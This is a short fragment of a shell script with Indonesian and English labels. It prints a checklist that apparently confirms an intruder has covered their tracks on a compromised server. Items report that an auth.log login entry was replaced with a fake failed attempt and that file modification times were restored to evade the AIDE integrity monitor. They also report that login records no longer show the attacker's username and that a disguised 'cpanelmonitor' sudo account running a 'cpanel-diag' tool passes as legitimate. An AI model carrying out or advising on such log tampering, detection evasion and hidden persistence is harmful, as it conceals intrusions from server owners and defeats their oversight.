printf "  ├─ %-38s %s\n" "find / -name '*.pub'"            "CLEAN — tidak ada key file"
printf "  ├─ %-38s %s\n" "last / who (post-logout)"        "LOGIN entry, bukan username kita"
printf "  ├─ %-38s %s\n" "auth.log login entry"            "diganti failed attempt — no gap"
printf "  ├─ %-38s %s\n" "auth.log log lain"               "UTUH — tidak disentuh"
printf "  ├─ %-38s %s\n" "mtime semua file"                "RESTORED — AIDE evaded"
printf "  ├─ %-38s %s\n" "sudo -l cpanelmonitor"           "scoped: cpanel-diag only"
printf "  ├─ %-38s %s\n" "cat cpanel-diag"                 "diagnostic tool — legitimate"
printf "  └─ %-38s %s\n" "dpkg -S /usr/local/cpanel/*"     "not found — EXPECTED di /usr/local"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
